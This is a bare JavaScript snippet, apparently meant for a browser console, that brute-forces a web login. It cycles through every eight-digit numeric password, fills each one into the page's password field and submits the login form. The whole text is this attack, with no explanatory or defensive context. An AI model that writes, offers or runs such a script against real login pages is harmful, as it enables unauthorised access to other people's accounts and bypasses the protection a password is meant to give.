for (let i = 0; i <= 99999999; i++) {
    s = String(i).padStart(8, "0");
    console.log(s);
    document.getElementById("login-password").value = s;
    const loginForm = document.getElementById('loginForm');
    loginForm.dispatchEvent(new Event('submit'));
}